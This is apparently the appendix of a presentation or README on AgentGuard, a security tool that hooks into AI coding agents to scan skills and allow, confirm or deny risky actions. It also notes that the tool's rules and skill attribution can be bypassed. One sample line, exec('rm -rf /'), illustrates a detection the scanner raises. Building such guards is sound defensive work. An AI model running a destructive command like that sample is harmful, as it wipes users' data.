- **Documentation**: [docs folder](https://github.com/GoPlusSecurity/agentguard/tree/main/docs)
- **GoPlus Security**: [gopluslabs.io](https://gopluslabs.io)

**Built with ❤️ by GoPlus Security**

---

# Appendix: Technical Deep Dive

---

## Scanner Implementation Details

### File Discovery Algorithm

```mermaid
flowchart TB
    Start["Input: Target Path"] --> Check{Path Type?}

    Check -->|File| Single["Scan Single File"]
    Check -->|Directory| Walk["Recursive Walk"]

    Walk --> Skip{Skip?}
    Skip -->|"node_modules<br/>dist, .git"| Ignore["Ignore"]
    Skip -->|"*.min.js<br/>*-lock.json"| Ignore
    Skip -->|No| Include["Include File"]

    Include --> Type{File Type?}
    Type -->|".js, .ts, .py"| Code["Code Scanner"]
    Type -->|".sol"| Web3["Web3 Scanner"]
    Type -->|".md"| Markdown["Markdown Scanner"]
    Type -->|".json, .yaml"| Config["Config Scanner"]

    Code --> Rules["Apply Relevant Rules"]
    Web3 --> Rules
    Markdown --> Extract["Extract Code Blocks"]
    Extract --> Rules
    Config --> Rules

    Rules --> Base64{Contains Base64?}
    Base64 -->|Yes| Decode["Decode & Re-scan"]
    Decode --> Rules

    Base64 -->|No| Results["Collect Findings"]
    Rules --> Results
    Single --> Results

    Results --> Report["Generate Report"]
```

### Markdown Code Block Extraction

Only scan code inside fenced code blocks to reduce false positives:

```markdown
<!-- This text is ignored -->

```javascript
// This code IS scanned
exec("rm -rf /");  // Would trigger SHELL_EXEC
```

<!-- This text is also ignored -->
```

---

## Action Evaluation Decision Tree

```mermaid
flowchart TB
    Start["Action Request"] --> Parse{Parse Type}

    Parse -->|exec_command| Exec["ExecDetector"]
    Parse -->|network_request| Net["NetworkDetector"]
    Parse -->|read_file| FileR["FileDetector"]
    Parse -->|write_file| FileW["FileDetector"]
    Parse -->|secret_access| Secret["SecretDetector"]
    Parse -->|web3_tx| Web3T["Web3Detector + GoPlus"]
    Parse -->|web3_sign| Web3S["Web3Detector + GoPlus"]

    Exec --> Registry["Query Trust Registry"]
    Net --> Registry
    FileR --> Registry
    FileW --> Registry
    Secret --> Registry
    Web3T --> Registry
    Web3S --> Registry

    Registry --> Caps["Check Capabilities"]
    Caps --> Policy["Apply Default Policies"]

    Policy --> Level{Protection Level}

    Level -->|Strict| Strict["Block all risky"]
    Level -->|Balanced| Balanced["Block dangerous<br/>Confirm risky"]
    Level -->|Permissive| Permissive["Block critical only"]

    Strict --> Decision["ALLOW / CONFIRM / DENY"]
    Balanced --> Decision
    Permissive --> Decision

    Decision --> Log["Log to Audit"]
    Log --> Return["Return to Agent"]
```

---

## Trust Registry Schema

```json
{
  "attestations": [
    {
      "id": "trading-bot",
      "source": "/Users/alice/.claude/skills/trading-bot",
      "version": "1.2.0",
      "artifact_hash": "sha256:abc123...",
      "trust_level": "restricted",
      "capabilities": {
        "network_allowlist": [
          "api.binance.com",
          "api.bybit.com",
          "*.coingecko.com"
        ],
        "filesystem_allowlist": [
          "./config/**",
          "./logs/**"
        ],
        "exec": "deny",
        "secrets_allowlist": [
          "BINANCE_API_KEY",
          "BINANCE_API_SECRET"
        ],
        "web3": {
          "chains_allowlist": [1, 56, 137, 42161],
          "rpc_allowlist": ["*"],
          "tx_policy": "confirm_high_risk"
        }
      },
      "reviewed_by": "security-team",
      "reviewed_at": "2025-01-15T14:30:00Z",
      "notes": "Approved for trading operations",
      "status": "active"
    }
  ]
}
```

---

## Adapter Abstraction Layer

```mermaid
classDiagram
    class HookAdapter {
        <<interface>>
        +register() void
        +onPreToolUse(context) HookDecision
        +onPostToolUse(context) void
        +getProtectionLevel() string
    }

    class ClaudeCodeAdapter {
        +register() void
        +onPreToolUse(context) HookDecision
        +onPostToolUse(context) void
        -inferSkillFromTranscript() string
    }

    class OpenClawAdapter {
        +register() void
        +onPreToolUse(context) HookDecision
        +onPostToolUse(context) void
        -getPluginFromTool() string
        -autoScanPlugins() void
    }

    class DecisionEngine {
        +evaluate(action) Decision
        +applyPolicy(action) Decision
        +checkCapabilities(skill) boolean
    }

    HookAdapter <|-- ClaudeCodeAdapter
    HookAdapter <|-- OpenClawAdapter

    ClaudeCodeAdapter --> DecisionEngine
    OpenClawAdapter --> DecisionEngine

    DecisionEngine --> ActionEvaluator
    DecisionEngine --> TrustRegistry
```

Both adapters share the same decision engine, ensuring consistent security policies across platforms.

---

## GoPlus API Integration Flow

```mermaid
sequenceDiagram
    participant User as 👤 User
    participant Guard as 🛡️ AgentGuard
    participant GoPlus as 🌐 GoPlus API

    User->>Guard: Evaluate web3_tx

    par Parallel Checks
        Guard->>GoPlus: 1. Check origin URL (phishing?)
        GoPlus-->>Guard: Phishing database result

        Guard->>GoPlus: 2. Check address security
        GoPlus-->>Guard: Address reputation + risk score

        Guard->>GoPlus: 3. Simulate transaction
        Note over GoPlus: Predict:<br/>- Balance changes<br/>- Approval changes<br/>- Risk indicators
        GoPlus-->>Guard: Simulation result
    end

    Guard->>Guard: Combine all findings
    Guard->>Guard: Apply policies

    alt Critical Risk (phishing/malicious)
        Guard->>User: 🚫 DENY
    else High Risk (unlimited approval)
        Guard->>User: ⚠️ CONFIRM
    else Low Risk
        Guard->>User: ✅ ALLOW
    end
```

### Graceful Degradation

If GoPlus API is unavailable:
- Phishing/address checks are skipped (log warning)
- Transaction simulation is skipped (add SIMULATION_UNAVAILABLE tag)
- Fall back to policy-based rules only
- User is notified of limited checks

---

## Performance Characteristics

```mermaid
graph LR
    subgraph "Layer 1: Hooks"
        H1["Hook Latency:<br/>&lt; 10ms typical"]
        H2["Decision Cache:<br/>Safe commands O(1)"]
        H3["Async Logging:<br/>Non-blocking"]
    end

    subgraph "Layer 2: Scan"
        S1["File Discovery:<br/>O(n) files"]
        S2["Rule Matching:<br/>Grep parallel"]
        S3["Report Generation:<br/>&lt; 100ms"]
    end

    subgraph "Web3 Enhanced"
        W1["GoPlus API:<br/>~200-500ms"]
        W2["Parallel Checks:<br/>3 APIs concurrent"]
        W3["Cache Results:<br/>1 hour TTL"]
    end

    H1 & H2 & H3 --> Fast["Minimal Agent Slowdown"]
    S1 & S2 & S3 --> Fast
    W1 & W2 & W3 --> Acceptable["Acceptable for Security-Critical"]

    style Fast fill:#c8e6c9,stroke:#388e3c
    style Acceptable fill:#fff9c4,stroke:#f9a825
```

### Benchmarks (Typical)

- **Hook evaluation**: 5-10ms per action
- **Scan small project**: 100-500ms (5-20 files)
- **Scan large project**: 1-3s (100+ files)
- **GoPlus API call**: 200-500ms (parallel)

---

## Security Guarantees & Limitations

### What AgentGuard Guarantees ✅

1. **Hook-based blocking** — Dangerous commands are intercepted before execution
2. **Static analysis** — Known malicious patterns are detected in code
3. **Trust enforcement** — Capability model limits skill actions
4. **Audit trail** — All security events are logged

### What AgentGuard Cannot Guarantee ❌

1. **100% detection** — Novel attack vectors may bypass rules
2. **Perfect skill attribution** — Transcript heuristics can be fooled
3. **Preventing skill installation** — Hooks only intercept post-load tool calls
4. **Zero false positives** — Some safe actions may require confirmation

### Best Practices

- **Use balanced mode** for daily work (default)
- **Review audit logs** regularly (`/agentguard report`)
- **Manually scan** third-party skills before trust (`/agentguard scan`)
- **Keep AgentGuard updated** for latest rules and patches

---

## Compliance & Regulatory Alignment

```mermaid
graph TB
    AG["AgentGuard Security Controls"]

    AG --> C1["Access Control<br/>Capability model"]
    AG --> C2["Audit Logging<br/>Complete trail"]
    AG --> C3["Data Protection<br/>Secret scanning"]
    AG --> C4["Risk Management<br/>Trust levels"]

    C1 --> SOC2["SOC 2 Type II<br/>Access Controls"]
    C2 --> SOC2

    C2 --> GDPR["GDPR<br/>Data Processing Records"]
    C3 --> GDPR

    C1 --> ISO["ISO 27001<br/>Information Security"]
    C4 --> ISO

    C2 --> PCI["PCI DSS<br/>Audit Requirements"]
    C3 --> PCI

    style SOC2 fill:#e3f2fd,stroke:#1976d2
    style GDPR fill:#e3f2fd,stroke:#1976d2
    style ISO fill:#e3f2fd,stroke:#1976d2
    style PCI fill:#e3f2fd,stroke:#1976d2
```

AgentGuard provides security controls that align with common compliance frameworks.

---

# End of Presentation

**Questions?**

📧 Contact: [github.com/GoPlusSecurity/agentguard/issues](https://github.com/GoPlusSecurity/agentguard/issues)
